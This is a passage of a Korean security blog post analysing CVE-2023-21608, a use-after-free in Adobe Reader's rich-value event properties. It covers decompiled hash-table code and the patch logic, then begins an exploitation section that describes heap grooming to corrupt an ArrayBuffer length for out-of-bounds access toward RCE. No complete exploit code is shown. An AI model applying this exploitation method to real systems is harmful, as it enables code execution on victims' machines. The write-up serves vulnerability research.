  <span class="hljs-comment">// Before Insertion</span>
  <span class="hljs-comment">// </span>
  <span class="hljs-comment">// ... &lt;-&gt; tmp &lt;-&gt; target &lt;-&gt; ...</span>
  <span class="hljs-comment">// </span>
  <span class="hljs-comment">// After Insertion</span>
  <span class="hljs-comment">//  </span>
  <span class="hljs-comment">//  ... &lt;-&gt; tmp &lt;-&gt; newNode &lt;-&gt; target &lt;-&gt; ...</span>
  idx = DataHash &amp; hashTable-&gt;HashBuckets.BucketMaxIndex;
  v6 = hashTable-&gt;HashBuckets.HashBucketBegin;
  result = newNode;
  <span class="hljs-keyword">if</span> ( v6[idx].BucketHead == hashTable-&gt;DefaultHead )
  {
    v6[idx].BucketHead = newNode;
LABEL_6:
    v6[idx].BucketTail = newNode;
    <span class="hljs-keyword">return</span> result;
  }
  <span class="hljs-keyword">if</span> ( v6[idx].BucketHead == target )
  {
    v6[idx].BucketHead = newNode;
    <span class="hljs-keyword">return</span> result;
  }
  <span class="hljs-keyword">if</span> ( v6[idx].BucketTail == tmp )
    <span class="hljs-keyword">goto</span> LABEL_6;
  <span class="hljs-keyword">return</span> result;
}</code></pre>
<p>&#xC774;&#xD6C4; &#xC0BD;&#xC785;&#xC73C;&#xB85C; &#xC778;&#xD574; &#xBC84;&#xD0B7;&#xC758;  Head&#xB098; Tail&#xC774; &#xBC14;&#xB010; &#xACBD;&#xC6B0;, &#xD574;&#xB2F9;&#xD558;&#xB294; <code>HashBucketEntryHeader</code>&#xC758; <code>BucketHead</code>&#xB098; <code>BucketTail</code>&#xC744; &#xBCC0;&#xACBD;&#xD569;&#xB2C8;&#xB2E4;.</p>
<p>&#xC704; &#xACFC;&#xC815;&#xC744; &#xD1B5;&#xD574; &#xD574;&#xC2DC; &#xD14C;&#xC774;&#xBE14;&#xC5D0; <code>PointerType</code>&#xC758; &#xC0BD;&#xC785;&#xC774; &#xC774;&#xB8E8;&#xC5B4;&#xC9C4; &#xB2E4;&#xC74C; <code>CAggToESVal</code>&#xD568;&#xC218;&#xAC00; &#xD638;&#xCD9C;&#xB418;&#xACE0; &#xC774;&#xD6C4; &#xC544;&#xB798;&#xC758; <code>DeleteFromGlobalHashTable</code> &#xD568;&#xC218;&#xAC00; &#xD638;&#xCD9C;&#xB429;&#xB2C8;&#xB2E4;.</p>
<h2 id="DeleteGlobalFromHashTable"><a href="#DeleteGlobalFromHashTable" class="headerlink" title="DeleteGlobalFromHashTable"></a>DeleteGlobalFromHashTable</h2><pre><code class="hljs c"><span class="hljs-function"><span class="hljs-keyword">int</span> __thiscall <span class="hljs-title">DeleteFromGlobalHashTable</span><span class="hljs-params">(_DWORD *pData)</span></span>
<span class="hljs-function"></span>{
  <span class="hljs-keyword">int</span> result; <span class="hljs-comment">// eax</span>

  <span class="hljs-keyword">if</span> ( *pData )                                 
  {
    result = DeleteFromHashTable(&amp;GlobalHashTable, pData);
    *pData = <span class="hljs-number">0</span>;
  }
  <span class="hljs-keyword">return</span> result;
}</code></pre>
<p><code>GlobalHashTable</code>&#xACFC; <code>pData</code>&#xB97C; &#xC778;&#xC790;&#xB85C; <code>DeleteFromHashTable</code>&#xC744; &#xD638;&#xCD9C;&#xD569;&#xB2C8;&#xB2E4;</p>
<h3 id="DeleteFromHashTable"><a href="#DeleteFromHashTable" class="headerlink" title="DeleteFromHashTable"></a>DeleteFromHashTable</h3><pre><code class="hljs c"><span class="hljs-function"><span class="hljs-keyword">int</span> __thiscall <span class="hljs-title">DeleteFromHashTable</span><span class="hljs-params">(HashTable *hashTable, _DWORD *pData)</span></span>
<span class="hljs-function"></span>{
  <span class="hljs-keyword">int</span> DataHash; <span class="hljs-comment">// ebx</span>
  HashBucketEntry *v4; <span class="hljs-comment">// edi</span>
  ListEntry result; <span class="hljs-comment">// [esp+Ch] [ebp-8h] BYREF</span>

  DataHash = hashFunction(<span class="hljs-number">0x811C9DC5</span>, pData, <span class="hljs-number">4u</span>);
  v4 = FindDataFromHashTable(hashTable, &amp;result, pData, DataHash)-&gt;Blink;
  <span class="hljs-keyword">if</span> ( !v4 )
    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;                                   <span class="hljs-comment">// Not Found, No deletion</span>
  UnlinkTargetFromBucketEntryHeader(hashTable, v4, DataHash &amp; hashTable-&gt;HashBuckets.BucketMaxIndex);
  UnlinkSelf((<span class="hljs-keyword">int</span> *)&amp;hashTable-&gt;DefaultHead, v4);
  <span class="hljs-keyword">return</span> <span class="hljs-number">1</span>;
}</code></pre>
<p>&#xD638;&#xCD9C;&#xB41C; <code>DeleteFromHashTable</code>&#xD568;&#xC218;&#xC5D0;&#xC11C;&#xB294; <code>hashFunction</code>&#xACFC; <code>FindDataFromHashTable</code> &#xD568;&#xC218; &#xD638;&#xCD9C;&#xC744; &#xD1B5;&#xD574; &#xD574;&#xC2DC; &#xD14C;&#xC774;&#xBE14;&#xC5D0;&#xC11C; &#xC81C;&#xAC70;&#xD558;&#xACE0;&#xC790; &#xD558;&#xB294; &#xB370;&#xC774;&#xD130;&#xAC00; &#xD574;&#xC2DC; &#xD14C;&#xC774;&#xBE14;&#xC5D0; &#xC874;&#xC7AC;&#xD558;&#xB294;&#xC9C0; &#xD655;&#xC778;&#xD569;&#xB2C8;&#xB2E4;. &#xC874;&#xC7AC;&#xD558;&#xC9C0; &#xC54A;&#xB294;&#xB2E4;&#xBA74; &#xB2E4;&#xB978; &#xB3D9;&#xC791;&#xC744; &#xC218;&#xD589;&#xD558;&#xC9C0; &#xC54A;&#xACE0; &#xBC18;&#xD658;&#xD569;&#xB2C8;&#xB2E4;.</p>
<p>&#xC81C;&#xAC70;&#xD560; &#xB370;&#xC774;&#xD130;&#xAC00; &#xD574;&#xC2DC; &#xD14C;&#xC774;&#xBE14;&#xC5D0; &#xC874;&#xC7AC;&#xD55C;&#xB2E4;&#xBA74; &#xBA3C;&#xC800; &#xC544;&#xB798;&#xC758; <code>UnlinkTargetFromBucketEntryHeader</code> &#xD568;&#xC218;&#xAC00; &#xD638;&#xCD9C;&#xB429;&#xB2C8;&#xB2E4;.</p>
<h3 id="UnlinkTargetFromBucketEntryHeader"><a href="#UnlinkTargetFromBucketEntryHeader" class="headerlink" title="UnlinkTargetFromBucketEntryHeader"></a>UnlinkTargetFromBucketEntryHeader</h3><pre><code class="hljs c"><span class="hljs-function">HashBucketEntry *__thiscall <span class="hljs-title">UnlinkTargetFromBucketEntryHeader</span><span class="hljs-params">(HashTable *hashTable, HashBucketEntry *target, <span class="hljs-keyword">int</span> Idx)</span></span>
<span class="hljs-function"></span>{
  HashBucketEntryHeader *v3; <span class="hljs-comment">// edx</span>
  HashBucketEntry *result; <span class="hljs-comment">// eax</span>

  v3 = hashTable-&gt;HashBuckets.HashBucketBegin;
  result = target;
  <span class="hljs-keyword">if</span> ( v3[Idx].BucketTail == target )           
  {
    <span class="hljs-keyword">if</span> ( v3[Idx].BucketHead == target )        
    {
      result = hashTable-&gt;DefaultHead;
      v3[Idx].BucketHead = result;
    }
    <span class="hljs-keyword">else</span>
    {
      result = target-&gt;list_entry.list_entry.Blink;
    }
    v3[Idx].BucketTail = result;
  }
  <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> ( v3[Idx].BucketHead == target )
  {
    result = target-&gt;list_entry.list_entry.Flink;
    v3[Idx].BucketHead = target-&gt;list_entry.list_entry.Flink;
  }
  <span class="hljs-keyword">return</span> result;
}</code></pre>
<p>&#xC774; &#xD568;&#xC218;&#xC5D0;&#xC11C;&#xB294; <code>BucketHead</code>&#xC640; <code>BucketTail</code>&#xAC00; &#xC81C;&#xAC70;&#xD558;&#xACE0;&#xC790; &#xD558;&#xB294; &#xB178;&#xB4DC;&#xC778; <code>target</code>&#xACFC; &#xAC19;&#xC740;&#xC9C0; &#xAC80;&#xC0AC;&#xD558;&#xC5EC; Head&#xB098; Tail &#xD639;&#xC740; &#xC591;&#xCABD; &#xBAA8;&#xB450;&#xB97C; &#xAC31;&#xC2E0;&#xD569;&#xB2C8;&#xB2E4;. &#xC774;&#xB97C; &#xD1B5;&#xD574; <code>target</code>&#xC774; <code>BucketHead</code>&#xC778; &#xACBD;&#xC6B0;&#xC5D0;&#xB294; <code>target-&gt;Flink</code>&#xB97C; &#xC0C8;&#xB85C;&#xC6B4; Head&#xB85C; &#xAC31;&#xC2E0;&#xD558;&#xACE0; <code>BucketTail</code>&#xC778; &#xACBD;&#xC6B0;&#xC5D0;&#xB294; <code>target-&gt;Blink</code>&#xB97C; &#xC0C8;&#xB85C;&#xC6B4; Tail&#xB85C; &#xAC31;&#xC2E0;&#xD569;&#xB2C8;&#xB2E4;. <code>target</code>&#xC774; &#xBC84;&#xD0B7;&#xC5D0; &#xC874;&#xC7AC;&#xD558;&#xB294; &#xC720;&#xC77C;&#xD55C; &#xB178;&#xB4DC;&#xB77C;&#xBA74; <code>BucketHead</code>&#xC640; <code>BucketTail</code>&#xC744; &#xBAA8;&#xB450; <code>hashTable-&gt;DefaultHead</code>&#xB85C; &#xBCC0;&#xACBD;&#xD558;&#xC5EC; &#xBC84;&#xD0B7;&#xC774; &#xBE44;&#xC5C8;&#xC74C;&#xC744; &#xB098;&#xD0C0;&#xB0C5;&#xB2C8;&#xB2E4;.</p>
<p><code>DeleteFromHashTable</code>&#xC5D0;&#xC11C; &#xC774; &#xD568;&#xC218;&#xAC00; &#xBC18;&#xD658;&#xD55C; &#xB2E4;&#xC74C; &#xD638;&#xCD9C;&#xB418;&#xB294; &#xAC83;&#xC740; &#xC544;&#xB798;&#xC758; <code>UnlinkSelf</code> &#xD568;&#xC218;&#xC785;&#xB2C8;&#xB2E4;</p>
<h3 id="UnlinkSelf"><a href="#UnlinkSelf" class="headerlink" title="UnlinkSelf"></a>UnlinkSelf</h3><pre><code class="hljs c"><span class="hljs-function"><span class="hljs-keyword">int</span> __thiscall <span class="hljs-title">UnlinkSelf</span><span class="hljs-params">(<span class="hljs-keyword">int</span> *a1, HashBucketEntry *target)</span></span>
<span class="hljs-function"></span>{
  HashBucketEntry *v2; <span class="hljs-comment">// esi</span>

  v2 = target-&gt;list_entry.list_entry.Flink;
  --a1[<span class="hljs-number">1</span>];                                      <span class="hljs-comment">// decrease length</span>
  target-&gt;list_entry.list_entry.Blink-&gt;list_entry.list_entry.Flink = v2;<span class="hljs-comment">// Unlink</span>
  v2-&gt;list_entry.list_entry.Blink = target-&gt;list_entry.list_entry.Blink;
  sub_20867B89(target);                         <span class="hljs-comment">// free</span>
  <span class="hljs-keyword">return</span> (<span class="hljs-keyword">int</span>)v2;
}</code></pre>
<p>&#xCCAB; &#xBC88;&#xC9F8; &#xC778;&#xC790; <code>a1</code>&#xC73C;&#xB85C; &#xC804;&#xB2EC;&#xB41C; <code>GlobalHashTable.DefaultHead</code>&#xC758; &#xC8FC;&#xC18C;&#xC5D0; 4&#xB97C; &#xB354;&#xD55C; &#xC8FC;&#xC18C;&#xC5D0; &#xC704;&#xCE58;&#xD55C; <code>length</code>&#xB97C; 1 &#xAC10;&#xC18C;&#xC2DC;&#xD0A4;&#xACE0; &#xC81C;&#xAC70;&#xD558;&#xACE0;&#xC790; &#xD558;&#xB294; &#xB178;&#xB4DC;&#xC778; <code>target</code>&#xC744; &#xC5F0;&#xACB0; &#xB9AC;&#xC2A4;&#xD2B8;&#xC5D0;&#xC11C; &#xC81C;&#xAC70;&#xD569;&#xB2C8;&#xB2E4;. &#xC774;&#xD6C4; &#xD638;&#xCD9C;&#xB418;&#xB294; <code>sub_20867B89</code>&#xC5D0;&#xC11C;&#xB294; <code>target</code>&#xC774; &#xAC00;&#xB9AC;&#xD0A4;&#xB294; &#xBA54;&#xBAA8;&#xB9AC;&#xC758; &#xD574;&#xC81C;&#xAC00; &#xC774;&#xB8E8;&#xC5B4;&#xC9D1;&#xB2C8;&#xB2E4;.</p>
<h2 id="Patched-SetRichValueEventProp-amp-GetRichValueEventProp"><a href="#Patched-SetRichValueEventProp-amp-GetRichValueEventProp" class="headerlink" title="Patched : SetRichValueEventProp &amp; GetRichValueEventProp"></a>Patched : SetRichValueEventProp &amp; GetRichValueEventProp</h2><p><code>IsDataInGlobalHashTable</code>, <code>InsertToGlobalHashTable</code>, <code>DeleteFromGlobalHashTable</code>&#xD568;&#xC218;&#xC758; &#xD638;&#xCD9C;&#xC740; &#xC544;&#xB798;&#xC640; &#xAC19;&#xC774; <code>SetRichValueEventProp</code> &#xD568;&#xC218;&#xC5D0;&#xB3C4; <code>GetRichValueEventProp</code>&#xACFC; &#xC720;&#xC0AC;&#xD55C; &#xBC29;&#xC2DD;&#xC73C;&#xB85C; &#xCD94;&#xAC00;&#xB418;&#xC5C8;&#xC2B5;&#xB2C8;&#xB2E4;.</p>
<p>&#xADF8;&#xB7FC; &#xC774;&#xC81C; &#xC774;&#xB7EC;&#xD55C; &#xCF54;&#xB4DC;&#xB4E4;&#xC774; &#xCD94;&#xAC00;&#xB428;&#xC73C;&#xB85C;&#xC368; &#xC5B4;&#xB5BB;&#xAC8C; &#xCDE8;&#xC57D;&#xC810;&#xC774; &#xBC1C;&#xC0DD;&#xD558;&#xC9C0; &#xC54A;&#xAC8C; &#xB418;&#xB294;&#xC9C0; &#xC54C;&#xC544;&#xBD05;&#xC2DC;&#xB2E4;!</p>
<pre><code class="hljs c"><span class="hljs-function"><span class="hljs-keyword">int</span> __cdecl <span class="hljs-title">SetRichValueEventProp</span><span class="hljs-params">(<span class="hljs-keyword">wchar_t</span> *a1, <span class="hljs-keyword">int</span> a2, <span class="hljs-keyword">int</span> a3)</span></span>
<span class="hljs-function"></span>{
  ...
  <span class="hljs-keyword">if</span> ( v7() )
  {
    ...
    <span class="hljs-keyword">if</span> ( !v8() )
    {
      ...
      <span class="hljs-keyword">if</span> ( (_WORD)v34 == v16()
        || (v29 = <span class="hljs-number">0</span>,
            v28 = (<span class="hljs-keyword">int</span>)<span class="hljs-string">&quot;bWillCommit&quot;</span>,
            v27 = v4,
            v17 = *(<span class="hljs-keyword">int</span> (**)(<span class="hljs-keyword">void</span>))(dword_2147CFA0 + <span class="hljs-number">196</span>),
            __guard_check_icall_fptr(v4, <span class="hljs-string">&quot;bWillCommit&quot;</span>),
            v18 = v17(),
            (_WORD)v18) )
      {
LABEL_12:
        v29 = <span class="hljs-string">&quot;CAgg_P&quot;</span>;
        v18 = sub_20A4BC05(v4, (<span class="hljs-keyword">wchar_t</span> *)<span class="hljs-string">&quot;richValue&quot;</span>);
        PointerType = (_DWORD *)v18;
        <span class="hljs-keyword">if</span> ( v18 )
        {
          LOBYTE(v18) = IsDataInGlobalHashTable(v18);
          <span class="hljs-keyword">if</span> ( !(_BYTE)v18 )                    <span class="hljs-comment">// Not in process</span>
          {
            v21 = InsertToGlobalHashTable((<span class="hljs-keyword">int</span>)&amp;PointerTypePtr, (<span class="hljs-keyword">int</span>)PointerType);
            LOBYTE(v36) = <span class="hljs-number">1</span>;
            CAgg::Convert((<span class="hljs-keyword">int</span>)v21, v22, PointerType, <span class="hljs-number">0</span>);
            sub_20AD749C((<span class="hljs-keyword">int</span>)PointerType, v33, <span class="hljs-number">0</span>);<span class="hljs-comment">// GetRichValueEventProp called</span>
            v23 = *(<span class="hljs-keyword">void</span> (**)(<span class="hljs-keyword">void</span>))(dword_2147CFA0 + <span class="hljs-number">200</span>);
            v29 = (<span class="hljs-keyword">const</span> <span class="hljs-keyword">wchar_t</span> *)<span class="hljs-number">1</span>;
            __guard_check_icall_fptr(v4, <span class="hljs-string">&quot;bModified&quot;</span>);
            v23();
            v18 = DeleteFromGlobalHashTable((<span class="hljs-keyword">int</span>)&amp;PointerTypePtr);
          }
        }
      }
      sub_20AAE6F7(v18, v19, v35);
    }
    result = <span class="hljs-number">1</span>;
  }
  <span class="hljs-keyword">else</span>
  {
    ...
  }
  <span class="hljs-keyword">return</span> result;
}</code></pre>
<p>&#xCDE8;&#xC57D;&#xD55C; &#xBC84;&#xC804;&#xC5D0;&#xC11C; &#xBC84;&#xADF8;&#xAC00; &#xD2B8;&#xB9AC;&#xAC70;&#xB418;&#xB294; &#xACFC;&#xC815;&#xC774; &#xD328;&#xCE58;&#xB41C; &#xBC84;&#xC804;&#xC5D0; &#xB3D9;&#xC77C;&#xD558;&#xAC8C; &#xC801;&#xC6A9;&#xB420; &#xACBD;&#xC6B0;, &#xBA3C;&#xC800; <code>SetRichValueEventProp</code>&#xC5D0;&#xC11C; &#xD638;&#xCD9C;&#xB41C; <code>IsDataInGlobalHashTable</code>&#xC758; &#xBC18;&#xD658; &#xAC12;&#xC774; 0&#xC778; &#xACBD;&#xC6B0; <code>InsertToGlobalHashTable</code> &#xD568;&#xC218;&#xAC00; &#xD638;&#xCD9C;&#xB418;&#xC5B4; <code>PointerType</code>&#xC774; &#xD574;&#xC2DC; &#xD14C;&#xC774;&#xBE14;&#xC5D0; &#xCD94;&#xAC00;&#xB420; &#xAC83;&#xC774;&#xACE0; &#xC774;&#xD6C4; &#xD638;&#xCD9C;&#xB418;&#xB294; <code>sub_20AD749C</code>&#xD568;&#xC218;&#xB85C; &#xC778;&#xD574; <code>GetRichValueEventProp</code> &#xD568;&#xC218;&#xAC00; &#xD638;&#xCD9C;&#xB418;&#xACE0; &#xC544;&#xB798;&#xC758; &#xCF54;&#xB4DC;&#xAC00; &#xC2E4;&#xD589;&#xB418;&#xBA74;&#xC11C; <code>IsDataInGlobalHashTable</code>&#xD568;&#xC218;&#xAC00; &#xD638;&#xCD9C;&#xB429;&#xB2C8;&#xB2E4;.</p>
<pre><code class="hljs c"><span class="hljs-function"><span class="hljs-keyword">int</span> __cdecl <span class="hljs-title">GetRichValueEventProp</span><span class="hljs-params">(<span class="hljs-keyword">wchar_t</span> *a1, <span class="hljs-keyword">int</span> a2, <span class="hljs-keyword">int</span> a3)</span></span>
<span class="hljs-function"></span>{
  ...
  <span class="hljs-keyword">if</span> ( v5() )
  {
    ...
  }
  <span class="hljs-keyword">else</span>
  {
    ...
    <span class="hljs-keyword">if</span> ( v31
      &amp;&amp; (v23 = <span class="hljs-string">&quot;richValue&quot;</span>,
          v22 = (<span class="hljs-keyword">int</span>)v31,
          v11 = *(<span class="hljs-keyword">unsigned</span> __int16 (__fastcall **)(<span class="hljs-keyword">int</span>))(dword_2147CFA0 + <span class="hljs-number">180</span>),
          v12 = __guard_check_icall_fptr(v31, <span class="hljs-string">&quot;richValue&quot;</span>),
          v11(v12)) )
    {
      v23 = <span class="hljs-string">&quot;CAgg_P&quot;</span>;
      PointerType = sub_20A4BC05(v31, (<span class="hljs-keyword">wchar_t</span> *)<span class="hljs-string">&quot;richValue&quot;</span>);
      PointerType_1 = PointerType;
      <span class="hljs-keyword">if</span> ( PointerType )
      {
        LOBYTE(PointerType) = IsDataInGlobalHashTable(PointerType);
        <span class="hljs-keyword">if</span> ( !(_BYTE)PointerType )
        {
          v15 = InsertToGlobalHashTable((<span class="hljs-keyword">int</span>)&amp;v31, PointerType_1);
          LOBYTE(v33) = <span class="hljs-number">4</span>;
          CAggToESVal((<span class="hljs-keyword">int</span>)v15, v16, PropName, PointerType_1);
          PointerType = DeleteFromGlobalHashTable((<span class="hljs-keyword">int</span>)&amp;v31);
        }
      }
    }
    ...
  }
  <span class="hljs-keyword">return</span> result;
}</code></pre>
<p>&#xCDE8;&#xC57D;&#xD55C; &#xBC84;&#xC804;&#xC5D0;&#xC11C;&#xB294; &#xC544;&#xBB34;&#xB7F0; &#xAC80;&#xC99D; &#xC5C6;&#xC774; <code>CAggToESVal</code>&#xC774; &#xD638;&#xCD9C;&#xB418;&#xC5B4; &#xC5F4;&#xAC70; &#xB3C4;&#xC911;&#xC5D0; &#xC624;&#xBE0C;&#xC81D;&#xD2B8;&#xB4E4;&#xC774; &#xD574;&#xC81C;&#xB418;&#xACE0; &#xC774;&#xD6C4; Use-After-Free&#xAC00; &#xBC1C;&#xC0DD;&#xD558;&#xAC8C; &#xB418;&#xC9C0;&#xB9CC; &#xD328;&#xCE58;&#xB41C; &#xBC84;&#xC804;&#xC5D0;&#xC11C;&#xB294; <code>CAggToESVal</code>&#xC744; &#xD638;&#xCD9C;&#xD558;&#xAE30; &#xC804;&#xC5D0; <code>IsDataInGlobalHashTable</code> &#xD568;&#xC218;&#xAC00; &#xD638;&#xCD9C;&#xB429;&#xB2C8;&#xB2E4;. &#xC774;&#xB54C;&#xC758; <code>PointerType</code>&#xC740; <code>SetRichValueEventProp</code>&#xC758; <code>PointerType</code>&#xACFC; &#xAC19;&#xACE0; <code>SetRichValueEventProp</code>&#xC5D0;&#xC11C; &#xD638;&#xCD9C;&#xB41C; <code>InsertToGlobalHashTable</code> &#xD568;&#xC218;&#xC5D0; &#xC758;&#xD574; &#xC774;&#xBBF8; &#xD574;&#xC2DC; &#xD14C;&#xC774;&#xBE14;&#xC5D0; &#xC874;&#xC7AC;&#xD558;&#xB294; &#xC0C1;&#xD0DC;&#xC785;&#xB2C8;&#xB2E4;.</p>
<p>&#xB530;&#xB77C;&#xC11C; <code>GetRichValueEventProp</code>&#xC5D0;&#xC11C; &#xD638;&#xCD9C;&#xB41C; <code>IsDataInGlobalHashTable</code>&#xC740; <code>true</code>&#xB97C; &#xBC18;&#xD658;&#xD558;&#xAC8C; &#xB418;&#xACE0; <code>CAggToESVal</code>&#xC774; &#xD638;&#xCD9C;&#xB418;&#xC9C0; &#xC54A;&#xC544; &#xBC84;&#xADF8;&#xAC00; &#xBC1C;&#xC0DD;&#xD558;&#xC9C0; &#xC54A;&#xAC8C; &#xB429;&#xB2C8;&#xB2E4;.</p>
<p>&#xB610;&#xD55C; <code>richValue</code>&#xC640; &#xB3D9;&#xC77C;&#xD55C; &#xBC29;&#xC2DD;&#xC73C;&#xB85C; &#xBC84;&#xADF8;&#xB97C; &#xBC1C;&#xC0DD;&#xC2DC;&#xD0AC; &#xC218; &#xC788;&#xB294; <code>richChange</code>&#xC640; &#xAD00;&#xB828;&#xB41C; <code>SetRichChangeEventProp</code>&#xD568;&#xC218;&#xC640; <code>GetRichChangeEventProp</code>&#xD568;&#xC218;&#xB3C4; &#xAC19;&#xC740; &#xBC29;&#xC2DD;&#xC73C;&#xB85C; &#xD328;&#xCE58;&#xB418;&#xC5C8;&#xC2B5;&#xB2C8;&#xB2E4;.</p>
<h1 id="4-Exploitation"><a href="#4-Exploitation" class="headerlink" title="4. Exploitation"></a>4. Exploitation</h1><hr>
<p>&#xADF8;&#xB7FC; &#xC774;&#xC81C; &#xB300;&#xB9DD;&#xC758; &#xC775;&#xC2A4;&#xD50C;&#xB85C;&#xC787;&#xB9CC;&#xC774; &#xB0A8;&#xC558;&#xC2B5;&#xB2C8;&#xB2E4;. &#xC704;&#xC5D0;&#xC11C; &#xC598;&#xAE30;&#xD55C; &#xAC83;&#xCC98;&#xB7FC; &#xC775;&#xC2A4;&#xD50C;&#xB85C;&#xC787;&#xC5D0;&#xC11C;&#xB3C4; &#xC790;&#xBC14;&#xC2A4;&#xD06C;&#xB9BD;&#xD2B8;&#xAC00; &#xC0AC;&#xC6A9;&#xB418;&#xACE0; &#xC774;&#xC804;&#xAE4C;&#xC9C0; &#xC790;&#xBC14;&#xC2A4;&#xD06C;&#xB9BD;&#xD2B8; &#xC5D4;&#xC9C4; &#xC775;&#xC2A4;&#xD50C;&#xB85C;&#xC787; &#xACBD;&#xD5D8;&#xC774; &#xC5C6;&#xC5C8;&#xAE30;&#xC5D0; &#xAD49;&#xC7A5;&#xD788; &#xC2E0;&#xC120;&#xD558;&#xAC8C; &#xB290;&#xAEF4;&#xC9C0;&#xAE30;&#xB3C4; &#xD588;&#xC2B5;&#xB2C8;&#xB2E4;.</p>
<p><img src="/2024/08/04/pwndorei/1day1document_CVE-2023-21608/Untitled%205.png" srcset="/img/loading.gif" alt="Untitled"></p>
<blockquote>
<p><del>&#xADF8;&#xB798;&#xB3C4; &#xB09C; &#xD30C;&#xC774;&#xC36C;&#xC774; &#xC88B;&#xC544;</del></p>
</blockquote>
<p>RCE &#xC775;&#xC2A4;&#xD50C;&#xB85C;&#xC787;&#xC744; &#xC704;&#xD574; &#xBA3C;&#xC800; &#xD799; &#xADF8;&#xB8E8;&#xBC0D;&#xC744; &#xD1B5;&#xD574; Use-After-Free&#xAC00; &#xBC1C;&#xC0DD;&#xD558;&#xB294; &#xBA54;&#xBAA8;&#xB9AC;&#xC5D0; &#xACF5;&#xACA9;&#xC790;&#xAC00; &#xC870;&#xC791;&#xD560; &#xC218; &#xC788;&#xB294; &#xB370;&#xC774;&#xD130;&#xB97C; &#xD560;&#xB2F9;&#xD558;&#xACE0; &#xC774;&#xB97C; &#xD1B5;&#xD574; &#xBC84;&#xADF8;&#xAC00; &#xBC1C;&#xC0DD;&#xD560; &#xB54C; &#xBA54;&#xBAA8;&#xB9AC;&#xC5D0; &#xD560;&#xB2F9;&#xB41C; &#xD2B9;&#xC815; <code>ArrayBuffer</code>&#xC758; length&#xAC00; &#xB36E;&#xC5B4; &#xC4F0;&#xC774;&#xAC8C; &#xB9CC;&#xB4E4;&#xC5B4; &#xC774;&#xB97C; OOB Read/Write&#xC5D0; &#xC0AC;&#xC6A9;&#xD569;&#xB2C8;&#xB2E4;.</p>
<h2 id="1-Create-Corrupted-ArrayBuffer"><a href="#1-Create-Corrupted-ArrayBuffer" class="headerlink" title="1. Create Corrupted ArrayBuffer"></a>1. Create Corrupted ArrayBuffer</h2><p>&#xC544;&#xB798;&#xB294; page-heap&#xC774; &#xD65C;&#xC131;&#xD654;&#xB41C; &#xC0C1;&#xD0DC;&#xC5D0;&#xC11C; &#xD06C;&#xB798;&#xC2DC;&#xAC00; &#xBC1C;&#xC0DD;&#xD558;&#xB294; <code>CAgg::operator[]</code>&#xD568;&#xC218;&#xC785;&#xB2C8;&#xB2E4;.</p>
<h3 id="CAgg-operator"><a href="#CAgg-operator" class="headerlink" title="CAgg::operator[]"></a>CAgg::operator[]</h3><pre><code class="hljs c"><span class="hljs-keyword">int</span> __userpurge CAgg::<span class="hljs-keyword">operator</span>[]@&lt;eax&gt;(<span class="hljs-keyword">int</span> *<span class="hljs-keyword">this</span>@&lt;ecx&gt;, <span class="hljs-keyword">bool</span> *a2@&lt;ebx&gt;, <span class="hljs-keyword">wchar_t</span> *someID)
{
...
  <span class="hljs-keyword">if</span> ( *<span class="hljs-keyword">this</span> == <span class="hljs-number">0x13</span> )                          <span class="hljs-comment">// this-&gt;type</span>
  {
    v6 = *(<span class="hljs-keyword">int</span> (__fastcall **)(<span class="hljs-keyword">int</span>))(dword_21473CA4 + <span class="hljs-number">28</span>);
    v7 = __guard_check_icall_fptr(someID);
    v8 = (<span class="hljs-keyword">void</span> *)v6(v7);
    v15 = (<span class="hljs-keyword">wchar_t</span> *)sub_20867317(v8, <span class="hljs-number">1</span>);
    v9 = (<span class="hljs-keyword">int</span> *)<span class="hljs-keyword">this</span>[<span class="hljs-number">2</span>];
    v16 = <span class="hljs-number">0</span>;
    v11 = *(_DWORD *)sub_20AA6EED((<span class="hljs-keyword">int</span>)a2a, v10, v9, (<span class="hljs-keyword">int</span>)&amp;v15, (<span class="hljs-keyword">int</span>)a2a);
    v16 = <span class="hljs-number">1</span>;
    <span class="hljs-keyword">if</span> ( v15 )
      sub_208679A2(v15);
    result = v11 + <span class="hljs-number">24</span>;
  }
  <span class="hljs-keyword">else</span>
  {
    <span class="hljs-keyword">if</span> ( *<span class="hljs-keyword">this</span> == <span class="hljs-number">0x14</span> )
    {
      v4 = (_DWORD *)<span class="hljs-built_in">std</span>::<span class="hljs-built_in">map</span>&lt;<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">short</span>,CAgg&gt;::<span class="hljs-keyword">operator</span>[](<span class="hljs-keyword">this</span>[<span class="hljs-number">2</span>], (<span class="hljs-keyword">int</span>)v14, v12);
    }
    <span class="hljs-keyword">else</span>
    {
      CAgg::Convert((<span class="hljs-keyword">int</span>)<span class="hljs-keyword">this</span>, (_DWORD *)<span class="hljs-number">0x14</span>);
      v4 = (_DWORD *)<span class="hljs-built_in">std</span>::<span class="hljs-built_in">map</span>&lt;<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">short</span>,CAgg&gt;::<span class="hljs-keyword">operator</span>[](<span class="hljs-keyword">this</span>[<span class="hljs-number">2</span>], (<span class="hljs-keyword">int</span>)a2a, &amp;someID);<span class="hljs-comment">// this-&gt;map</span>
    }
    result = *v4 + <span class="hljs-number">24</span>;
  }
  <span class="hljs-keyword">return</span> result;
}</code></pre>
<p>&#xD799; &#xADF8;&#xB8E8;&#xBC0D;&#xC774; &#xC131;&#xACF5;&#xC801;&#xC73C;&#xB85C; &#xC774;&#xB8E8;&#xC5B4;&#xC9C4; &#xC0C1;&#xD0DC;&#xC5D0;&#xC11C;&#xB294; <code>EScript_ESObjectEnum_CallbackProc</code>&#xC5D0;&#xC11C; &#xC544;&#xB798;&#xCC98;&#xB7FC; &#xACF5;&#xACA9;&#xC790;&#xC5D0; &#xC758;&#xD574; &#xCEE8;&#xD2B8;&#xB864;&#xB418;&#xB294; &#xBA54;&#xBAA8;&#xB9AC;&#xB97C; &#xC0AC;&#xC6A9;&#xD574;&#xC11C; <code>CAgg::operator[]</code>&#xD568;&#xC218;&#xB97C; &#xD638;&#xCD9C;&#xD569;&#xB2C8;&#xB2E4;. </p>
<pre><code class="hljs apache"><span class="hljs-attribute">eax</span>=<span class="hljs-number">00001</span>b<span class="hljs-number">36</span> ebx=<span class="hljs-number">00000000</span> ecx=<span class="hljs-number">2909</span>d<span class="hljs-number">478</span> edx=<span class="hljs-number">10</span>e<span class="hljs-number">60</span>da<span class="hljs-number">0</span> esi=<span class="hljs-number">71</span>eaef<span class="hljs-number">50</span> edi=<span class="hljs-number">2909</span>d<span class="hljs-number">478</span>
